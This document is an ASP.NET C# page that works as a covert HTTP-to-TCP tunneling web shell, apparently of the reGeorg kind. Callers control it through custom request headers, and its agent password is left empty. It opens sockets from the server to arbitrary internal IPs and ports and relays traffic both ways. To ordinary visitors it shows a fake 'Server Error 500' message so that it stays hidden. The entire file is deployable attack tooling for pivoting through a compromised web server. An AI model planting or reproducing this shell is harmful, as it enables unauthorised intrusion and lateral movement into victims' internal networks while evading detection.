<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%

const string ACK_MESSAGE = "Server Error 500 (Internal Error)";
const string AGENT_PASSWORD = "";

const string OPERATION_HEADER = "X-OPERATION";
const string SVC_HEADER = "X-SVC";
const string STATUS_HEADER = "X-STATUS";
const string PORT_HEADER = "X-PORT";
const string IP_HEADER = "X-IP";
const string ERROR_MESSAGE_HEADER = "X-ERROR";
const string ID_HEADER = "X-ID";
const string PASSWORD_HEADER = "X-PASSWORD";

const string OK_STATUS = "OK";
const string INCORRECT_STATUS = "INCORRECT";
const string FAIL_STATUS = "FAIL";

const string SOCKET_SESSION_KEY = "socket";

const string CONNECT_OPERATION = "CONNECT";
const string DISCONNECT_OPERATION = "DISCONNECT";
const string RECV_OPERATION = "RECV";
const string SEND_OPERATION = "SEND";


string cmd = Request.Headers.Get(OPERATION_HEADER);
string password = Request.Headers.Get(PASSWORD_HEADER);

if (cmd != "" && password == AGENT_PASSWORD)
{
	
	string connection_id = Request.Headers.Get(ID_HEADER);
	try {
		if (cmd == CONNECT_OPERATION) {
			int port = int.Parse(Request.Headers.Get(PORT_HEADER));
			IPAddress ip = IPAddress.Parse(Request.Headers.Get(IP_HEADER));
			
			System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
			Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			sender.Connect(remoteEP);
			sender.Blocking = false;
			
			string new_connection_id = (new Random()).Next().ToString();
			
			Session.Add(SOCKET_SESSION_KEY + new_connection_id, sender);
			Response.AddHeader(STATUS_HEADER, OK_STATUS);
			Response.AddHeader(SVC_HEADER, Environment.MachineName);
			Response.AddHeader(ID_HEADER, new_connection_id);
			return;
		}
		
		string svc = (string)Request.Headers.Get(SVC_HEADER);
		if (svc != Environment.MachineName) {
			Response.AddHeader(STATUS_HEADER, INCORRECT_STATUS);
			return;
		}
		
		if (cmd == DISCONNECT_OPERATION) {
			try {
				Socket s = (Socket)Session[SOCKET_SESSION_KEY + connection_id];
				s.Close();
			} catch (Exception ex){}
			Session.Abandon();
			Response.AddHeader(STATUS_HEADER, OK_STATUS);
		}
		else if (cmd == SEND_OPERATION) {
			string socket_key = SOCKET_SESSION_KEY + connection_id;
			Socket s = (Socket)Session[socket_key];
			int buffLen = Request.ContentLength;
			byte[] buff = new byte[buffLen];
			int c = 0;
			while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
				int nbytes = s.Send(buff);
				if (nbytes < 1) {
					Response.AddHeader(STATUS_HEADER, FAIL_STATUS);
					Response.AddHeader(ERROR_MESSAGE_HEADER, "Connection closed");
				}
			}
			Response.AddHeader(STATUS_HEADER, OK_STATUS);
		}
		else if (cmd == RECV_OPERATION) {
			Socket sock = (Socket)Session[SOCKET_SESSION_KEY + connection_id];
			int nbytes = 0;
			byte[] readBuff = new byte[512];
			try {
				if (sock.Poll(1, SelectMode.SelectRead) && 
						sock.Available == 0) {
					Response.AddHeader(STATUS_HEADER, FAIL_STATUS);
					Response.AddHeader(ERROR_MESSAGE_HEADER, "Connection closed");
					return;
				}
				
				while ((nbytes = sock.Receive(readBuff)) > 0) {
					byte[] newBuff = new byte[nbytes];
					System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, nbytes);
					Response.BinaryWrite(newBuff);
				}
				
				Response.AddHeader(STATUS_HEADER, OK_STATUS);
			}                    
			catch (SocketException soex) {
				Response.AddHeader(STATUS_HEADER, OK_STATUS);
			}
		}
		
	} catch (Exception ex) {
		Response.AddHeader(ERROR_MESSAGE_HEADER, ex.Message);
		Response.AddHeader(STATUS_HEADER, FAIL_STATUS);
	}			
} else {
	// to init session
	Session.Add("", "");
	Response.Write(ACK_MESSAGE);
}
%>
